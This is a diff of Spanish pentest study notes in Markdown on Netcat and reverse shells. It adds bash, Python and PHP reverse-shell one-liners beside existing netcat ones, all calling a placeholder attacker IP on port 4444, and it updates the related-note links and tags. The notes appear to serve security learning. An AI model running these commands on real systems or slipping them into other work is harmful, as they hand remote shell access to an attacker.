@@ -38,6 +38,11 @@ nc -e /bin/sh <attacker_ip> 4444
 
 # Sin -e (si no está compilado con support)
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f
+
+# Variantes alternativas
+bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ## Bind shell
@@ -71,22 +76,23 @@ nc -k -lvnp <port>               # Keep alive (no cerrar después de conexión)
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[Metasploit.md|Metasploit]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
+- [[Metasploit.md|Metasploit]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../06 - Explotacion y Post-Explotacion/Escalada de Privilegios.md|Escalada de Privilegios]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
+- [[../../../programacion/XML/xpath_xslt.md|xpath_xslt]] — Programacion: CLI/Scripting, Linux, Redes
+- [[../../../redes/dig_nslookup.md|dig_nslookup]] — Redes: CLI/Scripting, Linux, Redes
 
-> #escalada-privilegios #forense #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #windows
+> #cli #forense #linux #linux_ciber #metasploit #netcat #pentest #redes #reverse_shell #windows_ciber
